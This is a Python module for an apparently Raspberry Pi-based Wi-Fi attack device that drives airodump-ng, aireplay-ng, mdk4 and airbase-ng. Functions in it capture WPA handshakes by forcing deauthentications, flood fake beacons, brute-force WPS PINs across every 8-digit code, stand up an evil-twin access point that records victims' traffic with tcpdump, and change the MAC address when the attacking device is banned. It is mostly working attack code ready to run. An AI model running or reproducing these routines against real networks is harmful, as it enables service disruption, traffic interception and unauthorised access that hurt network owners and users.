from Libs.mojstd import *
import RPi.GPIO as GPIO
import re
import select
import subprocess
import time
import threading

bk_ = 0

class netstd():
#NETWORK/INTERFACE MANAGEMENT
    def __init__(self, INTERFACE):
        self.INTERFACE = INTERFACE
        self.stop_rickroll = threading.Event()
        self.airodump_process = None
        self.aireplay_process = None
        self.mdk4_deauth_process = None
        self.mdk4_beacon_flood_process = None
        self.airodump_running = False
        self.aireplay_running = False
        self.mdk4_deauth_running = False
        self.mdk4_deauth1_running = False
        self.mdk4_beacon_flood_running = False

    def start_airodump(self, selected_ssid, selected_bssid, selected_chan, dir='/root/M00N/WpaHandshakes/'):
        if not self.airodump_running:
            self.airodump_process = subprocess.Popen(
                ['sudo', 'airodump-ng', '-c', f'{selected_chan}', '--bssid', f'{selected_bssid}', '-w', dir+selected_ssid, f'{self.INTERFACE}'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=4060
            )
            self.airodump_running = True

    def start_airodump1(self, selected_bssid, selected_chan):
        if not self.airodump_running:
            self.airodump_process = subprocess.Popen(
                ['sudo', 'airodump-ng', '-c', f'{selected_chan}', '--bssid', f'{selected_bssid}', f'{self.INTERFACE}'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=4060
            )
            self.airodump_running = True
        while not GPIO.input(KEY2_PIN) == 0:
            pass
        self.stop_airodump()
        output, _ = self.airodump_process.communicate()
        print(output)
        return output.splitlines()
        


    def stop_airodump(self):
        if self.airodump_running:
            self.airodump_process.terminate()
            self.airodump_running = False

    def start_mdk4_deauth(self, selected_bssid, selected_chan, selected_mac=None):
        if not self.mdk4_deauth_process:
            if selected_mac != None:
                self.mdk4_deauth_process = subprocess.Popen(
                    ['sudo', 'mdk4', self.INTERFACE, 'd', '-B', selected_bssid, '-S', selected_mac, '-c', f'{selected_chan}'],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=4060
                )
            else:
                self.mdk4_deauth_process = subprocess.Popen(
                    ['sudo', 'mdk4', self.INTERFACE, 'd', '-B', selected_bssid, '-c', f'{selected_chan}'],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=4060
                )
        self.mdk4_deauth_running = True
    
    def start_mdk4_deauth1(self, selected_ssid, selected_chans):
        if not self.mdk4_deauth1_running:
            self.mdk4_deauth1_process = subprocess.Popen(
                ['sudo', 'mdk4', self.INTERFACE, 'd', '-E', selected_ssid, '-c', ",".join(map(str, selected_chans))],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=4060
            )
        self.mdk4_deauth1_running = True

    def start_mdk4_beacon_flood(self, lists):
        if not self.mdk4_beacon_flood_running:
            if lists != "Random":
                self.mdk4_beacon_flood_process = subprocess.Popen(
                        ['sudo', 'mdk4', self.INTERFACE, 'b', '-f', f'/root/M00N/Beacons/{lists}.txt', '-w', 'a', '-m'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        bufsize=4060
                    )
            else:
                self.mdk4_beacon_flood_process = subprocess.Popen(
                        ['sudo', 'mdk4', self.INTERFACE, 'b', '-a', '-w', 'nta', '-m'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        bufsize=4060
                )
            self.mdk4_beacon_flood_running = True

    def start_aireplay(self, selected_bssid):
        if not self.aireplay_process:
            self.aireplay_process = subprocess.Popen(
                ['sudo', 'aireplay-ng', '--deauth', '0', '-a', f'{selected_bssid}', f'{self.INTERFACE}'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=4060
            )
        self.aireplay_running = True
        
    def stop_aireplay(self):
        if self.aireplay_process:
            self.aireplay_process.terminate()
            self.aireplay_running = False

    def stop_mdk4_deauth(self):
        if self.mdk4_deauth_process:
            self.mdk4_deauth_process.terminate()
            self.mdk4_deauth_running = False

    def stop_mdk4_deauth1(self):
        if self.mdk4_deauth1_process:
            self.mdk4_deauth1_process.terminate()
            self.mdk4_deauth1_running = False
    
    def stop_mdk4_beacon_flood_process(self):
        if self.mdk4_beacon_flood_running:
            self.mdk4_beacon_flood_process.terminate()
            self.mdk4_beacon_flood_process = None
            self.mdk4_beacon_flood_running = False

    def cleanup_process(self):
        self.stop_airodump()
        self.stop_aireplay()
        self.stop_mdk4_deauth()
        self.mdk4_deauth_process = False
        self.aireplay_running = False
        self.airodump_running = False
        self.interface_stop()

    def run_result(self, selected_option, INTERFACE, wps_pin):
        result = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", selected_option, "infname", INTERFACE, "--wps-wps_pin", wps_pin],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return result

    def bk(self):
        if GPIO.input(KEY3_PIN) == 0:
            return True

    def interface_select(self):
        test = subprocess.Popen(["iwconfig",f"{self.INTERFACE}"], text=True, stdout=subprocess.PIPE)
        out = test.stdout.readline()
        return -1 if "No such device" in out else 0

    def interface_start(self):
        time.sleep(0.5)
        #subprocess.run(f"sudo airmon-ng check {self.INTERFACE}", shell=True)
        subprocess.run(f"sudo airmon-ng start {self.INTERFACE}", shell=True)
        return 0

    def interface_start1(self):
        subprocess.run(f"sudo airmon-ng check kill",shell=True)
        subprocess.run(f"sudo airmon-ng start {self.INTERFACE}",shell=True)
        return 1 if GPIO.input(KEY3_PIN) == 0 else 0

    def interface_stop(self):
        #subprocess.run(f"sudo ifconfig {self.INTERFACE} down",shell=True)
        subprocess.run(f"sudo airmon-ng stop {self.INTERFACE}",shell=True)
        return 1 if GPIO.input(KEY3_PIN) == 0 else 0

    def logs_handling(self):
        try:
            # Aireplay Logs
            with open("/root/M00N/Logs/aireplay.txt", 'r') as aireplay:    
                content = aireplay.read()            
                    # Generic error
                if "No such BSSID available." in content:
                    ui_print("""[ERR] No such\nBSSID\navailable.""", 4, (255, 0, 0))
                    self.cleanup_process()
                    time.sleep(0.5)
                    return -1
                
                if GPIO.input(KEY3_PIN) == 0:
                    self.cleanup_process()
                    return 1
            
                elif "Error" in content:
                    ui_print("""[ERR] Generic\n error""", 3, (255, 0, 0))
                    self.cleanup_process()
                    time.sleep(0.5)
                    return -1
                    
            # Airodump Logs
            with open(f"/root/M00N/Logs/airodump.txt", 'r') as airodump:
                content_ = airodump.read()
                # WPA Handshake found
                if "WPA handshake:" in content_:
                    ui_print("Handshake captured!", 3, (0, 255, 142))
                    self.cleanup_process()
                    time.sleep(0.5)
                    return 0
                
                if GPIO.input(KEY3_PIN) == 0:
                    self.cleanup_process()
                    return 1
                        
                # Wlan1 down
                elif f"{self.INTERFACE} down" in content_:
                    ui_print("MAC Banned!", 3, (255, 0, 0))
                    self.cleanup_process()
                    subprocess.run(f"macchanger -r {self.INTERFACE}", shell=True)
                    self.interface_stop()
                    ui_print("MAC Changed!", 2)
                    ui_print("Try again...", 2)
                    return 1
            
            return None
        except FileNotFoundError:
            pass
            
# HANDSHAKE
    # HANDSHAKE CAPTURE
    def handshake_capture(self, selected_chan, selected_ssid, selected_bssid, deauth):
        print(selected_bssid,selected_chan,selected_ssid,self.INTERFACE)

        self.start_airodump(selected_ssid, selected_bssid, selected_chan)
        ui_print("""Starting
handshake capture...""", "unset")
        if GPIO.input(KEY3_PIN) == 0:
            self.stop_airodump()
            return 1
        
        # Delay
        time.sleep(5)
        ui_print("Loading...", "unset")
        if GPIO.input(KEY3_PIN) == 0:
            self.stop_airodump()
            return 1
        
        # Write output
        with open("/root/M00N/Logs/airodump.txt", 'a') as file:
            if select.select([self.airodump_process.stdout], [], [], 0.5)[0]:
                chunk = self.airodump_process.stdout.readline()
                if chunk:
                    file.write(chunk)

        #DEAUTH
        time.sleep(1)
        ui_print("""Starting deauth
attack...""", "unset")

        if deauth == "aireplay-ng":
            self.start_aireplay(selected_bssid)
        else:
            self.start_mdk4_deauth(selected_bssid, selected_chan)

        if GPIO.input(KEY3_PIN) == 0:
            self.cleanup_process()
            return 1

        time.sleep(0.5)

        # Timeout settings
        start_time = time.time()
        timeout = 10 * 60
        ui_print("Loading...", 1)

        # Handshake capturing process
        ui_print("""Waiting the\n 4-way handshake""", "unset")
        while time.time() - start_time < timeout:
            if GPIO.input(KEY2_PIN) == 0:
                ui_print("Stopping deauth ...", 2.5)
                self.cleanup_process()

            # Write Logs - Airodump
            with open("/root/M00N/Logs/airodump.txt", 'a') as airodump_logs:
                if select.select([self.airodump_process.stdout], [], [], 0.2)[0]:
                    chunk = self.airodump_process.stdout.readline()
                    if chunk:
                        airodump_logs.write(chunk)
            
            # Write Logs - Aireplay o MDK4
            if self.aireplay_running:
                with open("/root/M00N/Logs/aireplay.txt", 'a') as aireplay_logs:
                    if select.select([self.aireplay_process.stdout], [], [], 0.1)[0]:
                        chunk = self.aireplay_process.stdout.readline()
                        if chunk:
                            aireplay_logs.write(chunk)

            elif self.mdk4_deauth_running:
                with open("/root/M00N/Logs/mdk4.txt", 'a') as mdk4_logs:
                    if select.select([self.mdk4_deauth_process.stdout], [], [], 0.1)[0]:
                        chunk = self.mdk4_deauth_process.stdout.readline()
                        if chunk:
                            mdk4_logs.write(chunk)
            
            result = self.logs_handling()
            if result != None:
                return result

            if GPIO.input(KEY3_PIN) == 0:
                self.cleanup_process()
                return 1
            
            # Delay
            time.sleep(0.1)
        
        ui_print("""[ERR] Timeout After
10 min""", 3, (255, 0, 0))
        self.cleanup_process()
        return 2

    

# RAW SNIFF
    # AIRODUMP RAW SNIFFING
    def raw_sniff(self, selected_ssid, selected_bssid, selected_chan):
        ui_print("""Starting
raw sniffing...""", 2)
        try:
            self.start_airodump(selected_ssid, selected_bssid, selected_chan, dir="/root/M00N/RawSniff/")
            if GPIO.input(KEY3_PIN) == 0:
                self.cleanup_process()
                return 1
            
            ui_print("Sniffing started", 1.5, (0, 255, 142))
            ui_print(f"Sniffing:\n{selected_ssid}", "unset")
            while GPIO.input(KEY3_PIN) != 0:
                if self.airodump_process.poll() is not None: 
                    ui_print("[ERR] Raw Sniff\ncrashed ...", 1.5, (255, 0, 0))
                    self.stop_airodump()  
                    self.airodump_running = False
                    raise RuntimeError("Airodump-ng crashed or was terminated externally")
                
                with open("/root/M00N/Logs/airodump.txt", 'a') as file:
                    file.write(self.airodump_process.stdout.readline())

                
            self.cleanup_process()
            return 1
        
        except Exception as e:
            print(e)
            ui_print(f"[ERR] {e}", 1.5, (255, 0, 0))
            self.cleanup_process()
            return -1

# WPS
    # WPS BRUTE FORCE
    def generate(self):
        for var in range(0, 100000000):
            yield f"{var:08d}"

    def connect(self, selected_option, wps_pin, INTERFACE):
        try:
            result = self.run_result(selected_option, INTERFACE, wps_pin)

            if "successfully activated" in result.stdout.lower():
                ui_print(f"Connected'{selected_option}' \n PIN: {wps_pin}", 5)
                return 0
            else:
                ui_print(f"PIN {wps_pin} failed.")
                return 1

        except Exception as e:
            ui_print(f"Error {wps_pin}:\n {e}")
            with open("/root/M00N/Logs/wps_out.txt", 'a') as file:
                file.write(f"Error {wps_pin}:\n {e}")
            return 1

    def brute_force_wps(self, selected_option, INTERFACE):
        for wps_pin in self.generate():
            if self.connect(selected_option, wps_pin, INTERFACE) == 0:
                ui_print(f"PIN : {wps_pin}")
                break
            else:
                pass
            time.sleep(0.1)
        return 0

#FAKE AP
    #EVIL TWIN
    def evil_twin(self, INTERFACE, selected_option, selected_bssid, selected_chan):
        subprocess.Popen(
        ['sudo', 'airbase-ng', '-a', selected_bssid, '-e', selected_option, '-c', str(selected_chan), INTERFACE],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
        )
        commands = [
            "sudo ip link add name M00N_wlan type bridge",
            "sudo ip link set M00N_wlan up",
            #"sudo ip link set lo master M00N_wlan",
            "sudo ip link set at0 master M00N_wlan",
            "sudo dhclient M00N_wlan &",
            f"sudo aireplay-ng --deauth 1000 -a {selected_bssid} {INTERFACE} --ignore-negative-one",
        ]

        for i in commands:
            process = subprocess.Popen(i, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True, bufsize=1)
            with open("/root/M00N/Logs/evil_twin.log", 'a') as file:
                file.write(process.stdout.readline())
            time.sleep(0.5)
            print(i)
        process = subprocess.Popen(
            ['sudo', 'tcpdump', '-i', 'M00N_wlan', '-w', '/root/M00N/pcap/evil_twin.pcap'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        with open("/root/M00N/Logs/evil_twin.log", 'a') as file:
            file.write(process.stdout.readline())
        return 0

    def run_airbase_ng(self, ssid, chan, interface):
        subprocess.Popen(
            ['sudo', 'airbase-ng', '-e', f"{ssid}", '-c', str(chan), interface],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )

#DEAUTH
    def deauth(self, selected_bssid, selected_chan, selected_mac):
        self.start_mdk4_deauth(selected_bssid, selected_chan, selected_mac)
        
        if GPIO.input(KEY3_PIN) == 0:
            self.cleanup_process()
            return self.bk()
        
        time.sleep(0.2)
        while GPIO.input(KEY3_PIN) != 0:
            try:
                with open("/root/M00N/Logs/mdk4.txt", 'a') as mdk4_logs:
                    if select.select([self.mdk4_deauth_process.stdout], [], [], 0.1)[0]:
                        chunk = self.mdk4_deauth_process.stdout.readline()
                        if chunk:
                            mdk4_logs.write(chunk)
            except Exception as e:
                with open("/root/M00N/Logs/errors.txt", "a") as error:
                    error.write(f"error {e}")

            if GPIO.input(KEY3_PIN) == 0:
                self.cleanup_process()
                subprocess.run("sudo rm -r root/M00N/Logs/*", shell=True)
                time.sleep(0.05)
                break
            time.sleep(0.1)
        return

